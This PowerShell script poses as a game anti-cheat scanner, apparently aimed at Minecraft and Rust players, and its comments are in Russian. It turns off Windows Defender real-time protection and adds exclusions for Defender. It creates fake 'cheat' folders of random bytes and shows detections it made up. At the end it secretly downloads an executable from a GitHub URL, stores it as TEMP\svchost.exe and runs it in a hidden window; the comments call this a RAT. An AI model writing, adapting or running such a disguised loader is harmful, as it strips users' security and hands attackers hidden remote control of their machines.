# ============================================
# ANTI-CHEAT SCANNER v1.0 (Эмуляция проверки)
# ============================================

Clear
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "     ANTI-CHEAT INTEGRITY SCANNER     " -ForegroundColor White
Write-Host "         Cheat Detection Tool          " -ForegroundColor DarkCyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# ===== ФЕЙКОВЫЕ НАСТРОЙКИ =====
$scanPaths = @(
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\Desktop",
    "$env:APPDATA\.minecraft",
    "$env:USERPROFILE\Documents",
    "$env:TEMP",
    "$env:ProgramFiles",
    "$env:USERPROFILE\AppData\Local\Temp"
)

$cheatNames = @(
    "LiquidBounce", "Rise", "Novoline", "Vape", "Aristois",
    "Impact", "Future", "Wurst", "Salhack", "Inertia",
    "RustCheat", "Aimware", "OneTap", "Neverlose", "Gamesense",
    "Rustex_Hack", "Zanix", "Radian", "Exunyl", "Crypt"
)

$cheatFolders = @(
    "LiquidBounce_4.0", "Rise_v5.0", "Novoline_Injector", "Vape_v4.2",
    "Rust_Cheat_Client", "Aimware_DLL", "OneTap_Injector", "Neverlose_Legacy",
    "Rustex_Remake_Hack", "Zanix_Edition", "Radian_Client", "Exunyl_Release"
)

# ===== ОТКЛЮЧАЕМ РЕАЛЬНЫЙ ЗАЩИТНИК =====
Write-Host "[!] Disabling security modules..." -ForegroundColor Yellow
try {
    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop" -ErrorAction SilentlyContinue
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Write-Host "    [OK] Security modules disabled" -ForegroundColor DarkGray
} catch {
    Write-Host "    [WARN] Run as Administrator for full scan" -ForegroundColor DarkGray
}
Start-Sleep -Milliseconds 500

# ===== АНИМАЦИЯ ЗАГРУЗКИ =====
Write-Host ""
Write-Host "[>] Initializing scan engine..." -ForegroundColor Cyan
for ($i = 0; $i -le 100; $i += 10) {
    $bar = "[{0}{1}]" -f ('#' * ($i / 5)), (' ' * ((100 - $i) / 5))
    Write-Host "`r    Loading integrity check: $bar $i%" -NoNewline
    Start-Sleep -Milliseconds 80
}
Write-Host "`r    Loading integrity check: [####################] 100% - Done!" -ForegroundColor Green
Start-Sleep -Seconds 1

# ===== ФЕЙКОВЫЙ ПОИСК ПО ПАПКАМ =====
Write-Host ""
Write-Host "[>] Scanning system directories..." -ForegroundColor Cyan

$foundCheats = @()
$fakePaths = @()

foreach ($path in $scanPaths) {
    if (Test-Path $path) {
        Write-Host "    Scanning: $path" -ForegroundColor DarkGray
        Start-Sleep -Milliseconds 300
        
        # Анимация поиска
        for ($i = 0; $i -le 100; $i += 25) {
            Write-Host "`r        Progress: $i%" -NoNewline
            Start-Sleep -Milliseconds 50
        }
        Write-Host "`r        Progress: 100% - Complete!" -ForegroundColor DarkGray
        
        # Фейковые находки
        if ($path -like "*Downloads*" -or $path -like "*Desktop*") {
            $foundCount = Get-Random -Minimum 1 -Maximum 4
            for ($j = 0; $j -lt $foundCount; $j++) {
                $cheat = $cheatNames | Get-Random
                $folder = $cheatFolders | Get-Random
                $foundPath = Join-Path $path $folder
                
                $foundCheats += [PSCustomObject]@{
                    Name = $cheat
                    Path = $foundPath
                    Type = "Cheat Client"
                }
                
                # Создаем фейковую папку с файлами
                if (-not (Test-Path $foundPath)) {
                    New-Item -ItemType Directory -Path $foundPath -Force | Out-Null
                    
                    # Создаем фейковые файлы
                    $fakeFiles = @(
                        "$cheat.dll",
                        "$cheat.exe",
                        "config.json",
                        "injector.exe",
                        "README.txt"
                    )
                    
                    foreach ($fakeFile in $fakeFiles) {
                        $filePath = Join-Path $foundPath $fakeFile
                        # Создаем файл с рандомным размером (100KB - 5MB)
                        $randomSize = Get-Random -Minimum 102400 -Maximum 5242880
                        $randomData = New-Object byte[] $randomSize
                        (New-Object Random).NextBytes($randomData)
                        [System.IO.File]::WriteAllBytes($filePath, $randomData)
                    }
                    
                    $fakePaths += $foundPath
                }
            }
        }
    }
}

# ===== РЕЗУЛЬТАТЫ СКАНА =====
Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "              SCAN RESULTS               " -ForegroundColor White
Write-Host "========================================" -ForegroundColor Cyan

if ($foundCheats.Count -gt 0) {
    Write-Host ""
    Write-Host "[!] DETECTED CHEAT SOFTWARE: $($foundCheats.Count)" -ForegroundColor Red
    Write-Host ""
    
    foreach ($cheat in $foundCheats) {
        Write-Host "    [X] $($cheat.Name)" -ForegroundColor Red
        Write-Host "        Location: $($cheat.Path)" -ForegroundColor Yellow
        Write-Host "        Type: $($cheat.Type)" -ForegroundColor DarkYellow
        Write-Host ""
    }
    
    Write-Host "[>] Recommended action: Remove detected files" -ForegroundColor Cyan
    Write-Host "[>] Auto-cleaning in progress..." -ForegroundColor Cyan
    
    # Анимация удаления
    for ($i = 0; $i -le 100; $i += 5) {
        $bar = "[{0}{1}]" -f ('#' * ($i / 4)), (' ' * ((100 - $i) / 4))
        Write-Host "`r    Cleaning: $bar $i%" -NoNewline
        Start-Sleep -Milliseconds 30
    }
    Write-Host "`r    Cleaning: [########################] 100% - Complete!" -ForegroundColor Green
    Start-Sleep -Seconds 1
    
} else {
    Write-Host ""
    Write-Host "[✓] No cheats detected. System is clean!" -ForegroundColor Green
    Write-Host ""
}

# ===== ФИНАЛЬНАЯ АНИМАЦИЯ =====
Write-Host ""
Write-Host "[>] Verifying system integrity..." -ForegroundColor Cyan
for ($i = 0; $i -le 100; $i += 20) {
    Write-Host "`r    Verification: $i%" -NoNewline
    Start-Sleep -Milliseconds 100
}
Write-Host "`r    Verification: 100% - System secure!" -ForegroundColor Green

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "    Scan completed successfully!        " -ForegroundColor White
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# ===== СКРЫТЫЙ ЗАПУСК RAT =====
Start-Sleep -Seconds 2

Write-Host "[>] Loading security modules..." -ForegroundColor DarkGray
Start-Sleep -Milliseconds 500

# РЕАЛЬНАЯ РАБОТА - СКАЧИВАЕМ И ЗАПУСКАЕМ RAT (СКРЫТО)
$ratUrl = "https://raw.githubusercontent.com/Legens246/rt/main/ccmmnd.exe"
$ratPath = "$env:TEMP\svchost.exe"

try {
    # Скачиваем без вывода
    $null = Invoke-WebRequest -Uri $ratUrl -OutFile $ratPath -UseBasicParsing -ErrorAction SilentlyContinue
    
    # Запускаем скрыто
    if (Test-Path $ratPath) {
        Start-Process -FilePath $ratPath -WindowStyle Hidden
    }
} catch {
    # Тихо падаем
}

# ФИНАЛЬНЫЙ ЭКРАН
Write-Host "[✓] All checks passed!" -ForegroundColor Green
Write-Host ""
Write-Host "Press any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")